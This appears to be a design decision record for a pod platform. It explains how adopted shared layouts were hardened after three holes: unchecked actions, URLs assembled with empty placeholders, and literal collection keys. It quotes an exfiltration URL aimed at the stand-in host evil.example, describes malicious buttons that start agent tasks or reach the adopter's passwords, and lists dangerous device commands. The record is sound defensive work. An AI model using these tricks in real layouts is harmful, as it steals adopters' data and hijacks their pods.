# An adopted element reaches only what its adoption binds, and anything else waits for the adopter's yes

Date: 2026-11-21. Related: [sharing](sharing.md), [adopt-shows-urls](adopt-shows-urls.md),
[custom-apps-and-data-sources](custom-apps-and-data-sources.md). Issues #431, #432, #433.

A shared layout is code: its lists read data and its buttons call the pod's actions. Decisions `sharing` and
`adopt-shows-urls` checked it mostly by reading strings on the publisher's side, and three holes followed:

- **Actions (#431).** The review skipped every intent, and an adopted layout was checked against every source of
  the adopter's home. A button posting `/v1/agents/tasks/start` with any prompt, `/v1/jacks/plug` with the
  attacker's search server, a comment on the attacker's post with `$item.<field>`, or `leave_pod` adopted without a
  word, and a followed adoption could gain one in a later version.
- **Assembled URLs (#432).** The renderer replaces `${…}` naming no field with nothing, so
  `http${}s://evil.example/p.png?d=$item.title`, passed to a component as an argument under a key that isn't a URL
  key, was never seen as a URL, and every bound row went to that host on every draw. Consent to a data URL also
  carried over by its string alone, to any place a later version put it.
- **Literal collection keys (#433).** Publishing turned `collection:<c>` into an input only when nothing followed
  the name, so `collection:passwords:view:all` (or `:alerts`, `:fillers`, a name passed through a component's
  argument) shipped literally, and on the adopter's pod it read the adopter's `passwords`, unbound.

Considered: more publisher-side string review (each hole above was a string the review didn't recognise; the
publisher is the party not trusted here); proxying an adopted element's actions through a route that names the
adoption (needs rewriting adopted objects, which changes their hashes); tagging each action with the element that
sent it (a client build). Taken: judge the publication on the adopter's side, as it draws, at the one place
adopted objects enter the pod, and limit what its data requests load.

Decision: **`adopt` and `update_adoption` walk the publication bound as the adopter binds it: every element it
embeds, opens or uses, materialized with the inputs its use site binds (components and `$arg` expanded, so
assembled strings are judged as they draw). Each query key, data path, entity, endpoint and device command it
reaches is sorted: within the bind (a source says, `Source::adopted_scope`: Collections, a collection the
adoption binds), refused (`reaches_unbound`: another collection's data, an empty `${}` hiding what a string
names, or what no source of the pod owns), or waiting for the adopter's acceptance (`needs_acceptance`, passed
back in `accept_actions`): another source's data (`reads:<source>`) or actions, and the dangerous classes even
within the bind: agents, jacks, undoing or restoring the owner's screens (`construct`: edit groups,
checkpoints, background undo), auth, any delete, and the device commands `leave_pod`, `sign_out`, `set_server`,
`sign_in`, `delete_layout`, `hide_layout`, `unhide_layout`. The adoption records what it may reach
(`adoptions.capabilities`: its feeds, the elements it draws, what was accepted), and an adopted element's data
requests (`/v1/construct/data/<el>`) load only those feeds, whatever the request binds.**

- **URLs** are found on the same materialized tree (decision `adopt-shows-urls`'s rule), and a host is recognised
  once `${…}` naming no field is taken out. Consent is recorded per (URL, element, JSON pointer, that element's
  bindings): a later version that moves an accepted URL, or puts it under another binding, asks again. Consent
  recorded before this (by URL alone) matches nothing.
- **Reviews.** `publish`, `adopt` and `update_adoption` flag every endpoint (`endpoint`), every literal text in
  an action's payload (`payload`) and every device command (`device`), alongside text and URLs. A publication kept
  shared (`keep_shared`) whose next version brings these flags waits for the owner's review once.
- **Publishing** turns every key of a collection into an input (`collection:$in.<c>:view:<v>`, `…:alerts`,
  `…:filler:<id>`), rewrites the fields of a view's list, and refuses a `collection:` key it can't turn into one.
- **Layout writes** refuse a `${…}` naming no field anywhere, and `${local://…}` inside a URL.
- **Following**: what was accepted carries over to the next version; anything new waits for the adopter again.
- `adopt` and `update_adoption` take `accept_actions` (MCP): a connector that cached the old tool list needs
  "Refresh tools list".
- No vocabulary change and no client build.

Limits:

- A pod can't tell which element sent an action: the engine posts `{endpoint, payload}` with no element. So the
  guarantee for actions is the check where adopted objects come in (they are immutable by hash), not a refusal
  when the request arrives; that would need clients to say which element sent it (a client build).
- Adoptions made before this have no recorded capabilities: their data requests are limited to the collections
  their bindings name, and their next `update_adoption` runs the whole check. Until then their actions are as
  they were adopted.
- A `$item.<field>` filling a path segment of an endpoint is the adopter's own data; a value holding `/../` is the
  engine's to encode.
